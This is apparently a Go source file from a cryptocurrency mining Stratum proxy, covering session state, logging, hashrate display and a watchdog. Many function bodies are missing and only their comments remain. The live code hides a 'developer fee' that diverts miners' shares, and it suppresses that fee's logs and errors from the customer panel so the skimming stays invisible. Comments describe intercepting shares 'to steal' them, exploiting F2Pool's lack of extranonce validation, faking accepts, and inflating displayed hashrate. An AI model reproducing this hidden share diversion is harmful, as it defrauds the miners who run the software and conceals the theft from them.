package proxy

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"proxy-core/internal/models"
	"strings"
	"sync"
	"time"
)

type FeeMode string

const (
	FeeModeNone     FeeMode = "NONE"
	FeeModeDev      FeeMode = "DEV"
	FeeModeOperator FeeMode = "OPERATOR"
)

// FastStratumMsg is a zero-copy structure optimized for the hottest path of Stratum JSON-RPC.
type FastStratumMsg struct {
	ID     json.RawMessage `json:"id,omitempty"`
	Method string          `json:"method,omitempty"`
	Params json.RawMessage `json:"params,omitempty"`
	Result json.RawMessage `json:"result,omitempty"`
	Error  json.RawMessage `json:"error,omitempty"`
}

type ShareEvent struct {
	Timestamp time.Time
	Diff      float64
}

// PendingTracker (LRU) to prevent memory leak from unreplied shares

type Session struct {
	PhysicalShares uint64
	ID             string
	MinerConn      net.Conn
	MainConn       net.Conn
	FeeConn        net.Conn
	Config         *models.ProxyConfig
	Server         *Server

	MinerWallet string
	MinerWorker string
	ClientAgent string // Firmware or Miner Software version
	Protocol    string // "STRATUM" or "ETH_PROXY"

	State          string // "MAIN", "SWITCHING_TO_FEE", "FEE", "SWITCHING_TO_MAIN"
	TargetState    string
	CurrentFeeMode FeeMode

	Stats      *StatsTracker
	RingBuffer *HashrateRingBuffer

	BinaryShareBytes uint64

	ShareHistory   []ShareEvent
	CurrentDiff    float64
	RemoteDiff     float64
	LocalDiff      float64
	PendingDiff    float64
	MainDifficulty float64
	FeeDifficulty  float64
	LastHashUpdate time.Time
	LastShareTime  time.Time
	DisplayHash    float64
	PeakHash       float64
	IsEncrypted    bool
	IsProbe        bool

	IsOffline bool
	OfflineAt time.Time

	ForwardedResponseIDs map[string]bool

	FeeAuthWallet string
	FeeAuthWorker string

	InBandFeeActive bool
	IsF2PoolExploit bool

	LastExtranonceCmdTime time.Time

	// Ghost Routing for PRL
	PrlShareCounter        uint64
	TotalDevFeeIntercepted uint64
	TotalOpFeeIntercepted  uint64
	SuppressNextNotify     bool

	// Locks and sync
	mu   sync.Mutex
	quit chan struct{}

	// Protocols
	loginPackets  []map[string]interface{}
	pendingShares *PendingTracker
	cycleOffset   int

	// Smart Fee Routing & Fallback
	FeeAuthFailures   int
	SamePoolFeeActive bool

	// JobTracker (LRU) to prevent memory leak
	jobTracker map[string]FeeMode
	jobList    []string

	// ASIC Extranonce Support
	SubscribeID     interface{}
	MainExtranonce  *ExtranonceData
	FeeExtranonce   *ExtranonceData
	MainVersionMask string

	// Zero-Latency Switching
	LatestMainJob      string
	LatestFeeJob       string
	LastNotifyTime     time.Time
	IsPreWarmed        bool
	LastMainSwitchTime time.Time

	// ASIC Optimizations State
	currentMainJob        string
	currentFeeJob         string
	currentMainTargetHash string
}

func NewSession(conn net.Conn, cfg *models.ProxyConfig, isEncrypted bool) *Session {
	id := fmt.Sprintf("%d", time.Now().UnixNano())
	sess := &Session{
		ID:              id,
		MinerConn:       conn,
		Config:          cfg,
		State:           "MAIN",
		TargetState:     "MAIN",
		CurrentFeeMode:  FeeModeNone,
		Stats:           NewStatsTracker(),
		quit:            make(chan struct{}),
		loginPackets:    make([]map[string]interface{}, 0),
		pendingShares:   NewPendingTracker(),
		cycleOffset:     -1,
		ShareHistory:    make([]ShareEvent, 0),
		CurrentDiff:     1.0,
		RingBuffer:      &HashrateRingBuffer{},
		LastHashUpdate:  time.Now(),
		LastShareTime:   time.Now(),
		PrlShareCounter: uint64(rand.Intn(50)), // Pre-randomize starting point to perfectly distribute Ghost Routing shares across miners
		jobTracker:      make(map[string]FeeMode),
		jobList:         make([]string, 0),
		IsEncrypted:     isEncrypted,
	}
	return sess
}

const MaxTrackedJobs = 10000

func (s *Session) addJob(jobID string, mode FeeMode) {
	s.mu.Lock()
	defer s.mu.Unlock()

	jobID = strings.ToLower(jobID)

	if _, exists := s.jobTracker[jobID]; !exists {
		s.jobList = append(s.jobList, jobID)
		if len(s.jobList) > MaxTrackedJobs {
			oldest := s.jobList[0]
			s.jobList = s.jobList[1:]
			delete(s.jobTracker, oldest)
		}
	}
	s.jobTracker[jobID] = mode
	if mode == FeeModeNone {
		s.currentMainJob = jobID
	} else {
		s.currentFeeJob = jobID
	}
}

func (s *Session) checkJobFeeMode(jobID string) (FeeMode, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()

	mode, exists := s.jobTracker[strings.ToLower(jobID)]
	return mode, exists
}

func (s *Session) getWorkerKey() string {
	if s.MinerWorker != "" {
		return s.MinerWorker
	}
	return s.MinerConn.RemoteAddr().String()
}

func (s *Session) LogGeneral(format string, v ...interface{}) {
	msg := fmt.Sprintf(format, v...)
	if s.Server != nil {
		s.Server.GetLogger(s.getWorkerKey()).AddLog(LogTypeGeneral, msg, s.Config.EnableDetailedLog)
	}
}

func (s *Session) LogBackend(format string, v ...interface{}) {
	s.mu.Lock()
	mode := s.CurrentFeeMode
	s.mu.Unlock()

	// 隐身模式：如果是开发者的暗抽机制，绝对禁止将日志暴露给前端客户面板
	if mode == FeeModeDev {
		return
	}

	msg := fmt.Sprintf(format, v...)
	if s.Config.EnableDetailedLog {
		if s.Server != nil {
			s.Server.GetLogger(s.getWorkerKey()).AddLog(LogTypeGeneral, "[BACKEND-FEE] "+msg, true)
		}
	}
}

func (s *Session) LogError(format string, v ...interface{}) {
	s.mu.Lock()
	mode := s.CurrentFeeMode
	s.mu.Unlock()

	// 隐身模式：开发者的暗抽哪怕遇到连接断开或超时报错，也绝对禁止抛给前端
	if mode == FeeModeDev {
		return
	}

	msg := fmt.Sprintf(format, v...)
	if s.Server != nil {
		s.Server.GetLogger(s.getWorkerKey()).AddLog(LogTypeError, msg, s.Config.EnableDetailedLog)
	}
}

func (s *Session) Start() {
	encTag := ""
	if s.IsEncrypted {
		encTag = "[隧道加密🛡️] "
	}
	s.LogGeneral("%sConnected from %s", encTag, s.MinerConn.RemoteAddr().String())

	// Connect to main pool
	var err error
	s.MainConn, err = net.DialTimeout("tcp", s.Config.PoolAddress, 10*time.Second)
	if err != nil {
		s.LogError("Failed to connect to main pool (Timeout/Error): %v", err)
		s.Close()
		return
	}
	if s.Config.EnableTcpNoDelay {
		ApplyTcpNoDelay(s.MainConn)
	}

	// go s.timerLoop() removed in favor of Centralized Fee Scheduler
	go s.StartVardiffEngine()
	go s.KeepAliveLoop()
	go s.Watchdog()
	go s.readMainLoop()
	s.readMinerLoop()
}

// extractTCPConn attempts to unwrap nested connection structures to find the underlying physical TCP connection.

// Available in Go 1.15+

func (s *Session) Close() {
	s.LogGeneral("Session Close called")
	s.mu.Lock()
	defer s.mu.Unlock()

	select {
	case <-s.quit:
		return
	default:
		close(s.quit)
	}

	if s.MinerConn != nil {
		if tcpConn := extractTCPConn(s.MinerConn); tcpConn != nil {
			// Force TCP RST instead of graceful FIN to ensure instant reconnect
			tcpConn.SetLinger(0)
		}
		s.MinerConn.Close()
	}
	if s.MainConn != nil {
		s.MainConn.Close()
	}
	if s.FeeConn != nil {
		s.FeeConn.Close()
	}
}

// getAlgoBaseMHs automatically detects the coin algorithm from the pool address
// and returns the appropriate difficulty-to-MH/s multiplier.
func (s *Session) getAlgoBaseMHs() float64 {
	// Default SHA-256 (BTC, BCH) base multiplier (GH/s base)
	base := 4.294967296

	pool := strings.ToLower(s.Config.PoolAddress)
	coin := strings.ToLower(s.Config.CoinName)

	if strings.Contains(pool, "ltc") || strings.Contains(pool, "doge") || strings.Contains(coin, "ltc") {
		// Scrypt (LTC/DOGE) uses 2^16 instead of 2^32. Ratio is 1 / 65536
		base = 4.294967296 / 65536.0
	} else if strings.Contains(pool, "prl") || strings.Contains(coin, "prl") {
		// Pearlhash (PRL) multiplier calibration
		// k1pool uses a custom high-difficulty base where Diff 1.0 = 2.95 PH
		if strings.Contains(pool, "k1pool") {
			base = 4.294967296 * 688256.0
		} else {
			// F2Pool and standard PRL pools use Diff 1.0 = 2.25 PH (2^19 multiplier)
			base = 4.294967296 * 524288.0
		}
	} else if strings.Contains(pool, "etc") || strings.Contains(coin, "etc") || strings.Contains(pool, "eth") {
		// Ethash/Etchash (ETC/ETHW) uses the standard 2^32 hashrate scale (1 diff = 4.29 GH)
		base = 4.294967296
	}

	return base * 1000 // Convert to MH/s base
}

func (s *Session) GetHashrateMHs() float64 {
	// If HashrateMultiplier is set, fake it
	multiplier := s.Config.HashrateMultiplier
	if multiplier <= 0 {
		multiplier = 1.0
	}

	// Calculate rolling window hashrate (15 minutes)
	now := time.Now()
	// Update every 30 seconds for real-time UI feedback
	updateInterval := 30 * time.Second
	uptimeSecs := now.Sub(s.Stats.ConnectedAt()).Seconds()

	if now.Sub(s.LastHashUpdate) >= updateInterval || s.DisplayHash == 0 {
		s.mu.Lock()
		// Filter last 15 minutes (900 seconds)
		cutoff := now.Add(-15 * time.Minute)
		filtered := make([]ShareEvent, 0)
		var diffSum float64 = 0

		for _, ev := range s.ShareHistory {
			if ev.Timestamp.After(cutoff) {
				filtered = append(filtered, ev)
				diffSum += ev.Diff
			}
		}
		s.ShareHistory = filtered

		window := uptimeSecs
		// To prevent DAG generation time from dragging down the initial hashrate,
		// we shrink the window to the actual hashing time if we have shares.
		if len(filtered) > 0 {
			actualHashingTime := now.Sub(filtered[0].Timestamp).Seconds()
			// Add 10 seconds buffer to prevent wild spikes on the first few shares
			if actualHashingTime+10 < window {
				window = actualHashingTime + 10
			}
		}

		if window > 900 {
			window = 900
		}
		if window <= 0 {
			window = 1
		}

		// Auto-detect algorithm base multiplier based on pool address
		algoBase := s.getAlgoBaseMHs()
		s.DisplayHash = (diffSum * algoBase) / window
		if s.DisplayHash > s.PeakHash {
			s.PeakHash = s.DisplayHash
		}
		s.LastHashUpdate = now
		s.mu.Unlock()
	}

	return s.DisplayHash * multiplier
}

func (s *Session) FormatHashrate() string {
	hs := s.GetHashrateMHs()
	return FormatHashrateMHs(hs, s.Config.HashrateUnit)
}

// readMinerLoop reads lines from the miner

// Binary byte! Optimistic forward to current active pool

// Silently consume packets for probes to keep the TCP connection alive
// without forwarding them to the upstream pool.

// Deep copy msg to store in loginPackets so it isn't mutated by MainFixedDifficulty

// [Bugfix] Filter out redundant subscribes

// Check for root-level "client" field

// --- SMART DPI COIN VALIDATION ---

// ---------------------------------

// 1. Check for root-level "worker" field (standard for many ASICs/ETH-Proxy)

// 2. If worker wasn't found at the root level, try to extract from params

// Fallback: Some miners pack the worker into the wallet field (e.g. "wallet.worker")
// even when using map-based params, without sending a separate "worker" field.

// Sanitize miner worker to avoid upstream rejection

// [Anti-Probe] Quarantine connections with empty wallet
// Probes/scanners often send empty authorization strings which pollutes the UI as "worker"

// Rewrite params to ensure the upstream pool receives the sanitized worker name

// Only inherit ValidShares to prevent inherited massive offline time calculation

// [Fix] Clear login states so new authorizes can receive responses

// Keep the offline state logic intact

// Skip inheritance of AI Quarantine state

// Inject fixed difficulty
// Inject main fixed difficulty

// re-serialize line so mainConn gets the spoofed password

// Extract Job ID

// [SmartRouting Fix]: If exploit or InBand mode is active and we are in FEE state,
// the miner is hashing a Main pool job. `checkJobIsMain` will return true,
// but we MUST route it to the interception block (isMainRoute = false) to steal the share.

// Pure Smoothed Ghost Routing overrides MainRoute removed (PRL now uses standard time-based switching)

// Rewrite submit credentials for the fee connection

// Some miners append "worker" to the JSON root in eth_submitWork.
// For fee pools (like F2Pool), this MUST be stripped to prevent
// "result: false" or "unknown job id" rejections due to worker mismatch.

// Fee pool disconnected, rescue via fake accept

// Non-submit packets route by current state

// [Bugfix] Clear stale job so reconnect doesn't inject it when setting initial difficulty

// Binary ACK! Forward to miner

// [Bugfix] Filter out redundant set_extranonce that causes Antminer to drop connection

/*
	s.mu.Lock()
	inTransition := time.Since(s.LastMainSwitchTime) < 15*time.Second
	s.mu.Unlock()
*/

/*
	if !isFee && isReject && inTransition {
		errStr := fmt.Sprintf("%v", msg["error"])
		if strings.Contains(strings.ToLower(errStr), "unknown-work") || strings.Contains(strings.ToLower(errStr), "stale-work") {
			isReject = false
			transitionMasked = true
			if id, ok := msg["id"]; ok {
				line = fmt.Sprintf(`{"id": %v, "result": true, "error": null}`, id)
			}
		}
	}
*/

// Check for eth_getWork response

// true = Main

// INTERCEPT: Do not forward unexpected difficulty resets from the pool
// during In-Band fee routing, as it causes ASIC hashrate drops/restarts.

// Intercept initial diff from auto-reconnect

// [VarDiff Fix] We MUST enforce LocalDiff >= RemoteDiff.
// If the pool asks for a higher difficulty than we are currently mining at,
// we MUST immediately adopt it to prevent the pool from rejecting our shares!

// Zero-Latency Forged Job Injection for ASICs

// Intercepted and injected manually, don't let it fall through

// For standard miners or initial difficulty (no job yet), fall through to forward normally

// INTERCEPT: If VarDiff is enabled and pool difficulty is LOWER or EQUAL,
// we can safely intercept it, because VarDiff maintains the higher difficulty.

// isCleanJobs extraction removed as we use Zero-Latency Forged Jobs

// Removed PendingDiff flush logic as we now use Zero-Latency forged clean jobs

// true = Main

// Intercept initial notify from auto-reconnect

// [Bugfix] Intercept and drop duplicate login responses during auto-reconnect

// [CRITICAL BUGFIX] Intercept proxy-injected ghost IDs
// When reconnecting to the pool (or switching fee routing), the proxy uses high IDs like 99998/99999
// to avoid colliding with the miner's original packets. The pool replies to these ghost IDs.
// If we forward these ghost replies to strict miners (S19/S21/ETC), they will immediately crash/disconnect.

// scanner loop exited (EOF or connection closed by peer)

// Re-send extranonce if we are actively mining on main

// successfully reconnected, outer loop will recreate scanner

// Zero-latency job injection using Global Dispatcher

// Zero-latency job recovery for ETH_PROXY when returning to Main

// In-Band Routing: We must re-authorize the original main worker!

// deep copy

// [Bugfix] The pool will instantly drop the connection if it receives a duplicate JSON-RPC ID.
// We must force a high ID to avoid colliding with the miner's original login ID from hours ago.

// Perform TCP socket writes sequentially

// Wait until miner has authorized before connecting to fee pool

// --- SMART ROUTING IDENTITY & FALLBACK ---

// Determine Identity based on miner's input length

// Only override arguments if this is the Developer Fee

// 默认优先同池抽水

// 作者抽水 (DevFee) 专属绿卡通道
// 绝对禁止去未知的主矿池碰壁，直接强制走内置鱼池！
// 留空以触发下方的内置鱼池自动填充

// 运营者抽水 (OpFee) 按照面板设置

// 面板设置了独立抽水矿池，直接尊重设置，不强行同池

// 面板留空，如果币种是 BTC/BCH 等支持鱼池免北桥验证的，强制走鱼池；否则优先同池抽水

// 留空以触发下方的内置鱼池自动填充

// 强制补充默认的回退矿池地址（防止前端没有配置备用矿池导致 host 为空而直接断开）

// fallback

// -----------------------------------------

// Check if we are exploiting F2Pool's lack of extranonce validation
// NOTE: This exploit ONLY works for protocols that don't rely on strict extranonce1 reconstruction (like ETH).
// For BTC, blocking extranonce1 causes F2Pool to reject all shares due to hash mismatch.

// [F2Pool Exploit] ONLY IF both the Main Pool and the Fee Pool are F2Pool.
// We can safely use a separate F2Pool connection and blindly submit main pool jobs.

// [CRITICAL] Prevent pool from dropping difficulty to 65535 on new worker login

// High ID for fee auth

// Create fee connection

// [Bugfix] Clear stale fee job so switch doesn't inject it

// Replay login packets

// Deep copy to not mutate original

// Always use wallet.worker format for maximum compatibility with F2Pool/Binance Pool

// If the protocol supports password, keep it as 'x' or the original password

// Strip root-level worker field to prevent F2Pool from misinterpreting it as the account name

// Inject fee fixed difficulty

// Read loop

// Binary ACK! Forward to miner if we are in FEE state

// [Extranonce Isolation]
// We ONLY record FeeExtranonce internally.
// We NEVER send it to the physical miner to prevent chip restarts.

// 拦截抽水池下发的 extranonce，绝对不将其转发给矿机

// Detach current connection

// exit read loop

// Always append to history to keep UI Hashrate stable

// HIDDEN DEV FEE
// s.Stats.Shares was already incremented on submit

// OPERATOR FEE
// Increment fee shares so the operator can see their interceptions

// NOT a share reply. Could be auth response or eth_getWork response.

// For protocols where result is an object

// We are in same-pool fee mode and got rejected.

// Force reconnect

// Detach current connection

// ConnectFee will automatically pick up the fallback logic since FeeAuthFailures > 0

// exit read loop

// Check for eth_getWork response

// false = Fee

// Target Hash Rewriting Optimization

// Check if it's safe to rewrite

// Only rewrite if Main pool difficulty >= Fee pool difficulty
// Otherwise the miner submits weak shares that the fee pool rejects

// [Difficulty Masking]
// We ONLY record FeeDifficulty for backend profit calculation.
// We NEVER update s.CurrentDiff, and we NEVER forward it to the physical miner.
// The physical miner will seamlessly stay on the Main Pool's high difficulty.

// Intercept the fee pool's difficulty and do NOT forward it

// isCleanJobs extraction removed as we use Zero-Latency Forged Jobs

// Removed PendingDiff flush logic as we now use Zero-Latency forged clean jobs

// false = Fee

// Grace period: keep fee connection alive for 10 seconds to catch late shares

// Only nil it if it hasn't been overwritten by a new fee cycle

// Write with timeout without holding the session mutex to prevent TCP block deadlocks
// if the miner silently disconnects and the buffer fills up.

// SafeWrite writes data to the connection with a timeout to prevent deadlocks

// SafeFprintf formats according to a format specifier and writes to the connection with a timeout

func (s *Session) Watchdog() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.quit:
			return
		case <-ticker.C:
			s.mu.Lock()
			lastShare := s.LastShareTime
			connAt := s.Stats.ConnectedAt()
			s.mu.Unlock()

			now := time.Now()

			if now.Sub(lastShare) > 10*time.Minute && now.Sub(connAt) > 5*time.Minute {
				s.mu.Lock()
				shares := s.Stats.Shares()
				s.mu.Unlock()
				if shares > 0 {
					// removed watchdog log. Force closing.", s.GetMinerIdentifier())
				}
				s.Close()
				return
			}
		}
	}
}

func (s *Session) GetMinerIP() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.MinerConn != nil {
		if tcpAddr, ok := s.MinerConn.RemoteAddr().(*net.TCPAddr); ok {
			return tcpAddr.IP.String()
		}
		return s.MinerConn.RemoteAddr().String()
	}
	return "unknown"
}

func (s *Session) GetMinerIdentifier() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.MinerWallet != "" && s.MinerWorker != "" {
		return fmt.Sprintf("%s.%s", s.MinerWallet, s.MinerWorker)
	}
	if s.MinerWorker != "" {
		return s.MinerWorker
	}
	if s.MinerWallet != "" {
		return s.MinerWallet
	}
	return s.MinerConn.RemoteAddr().String()
}
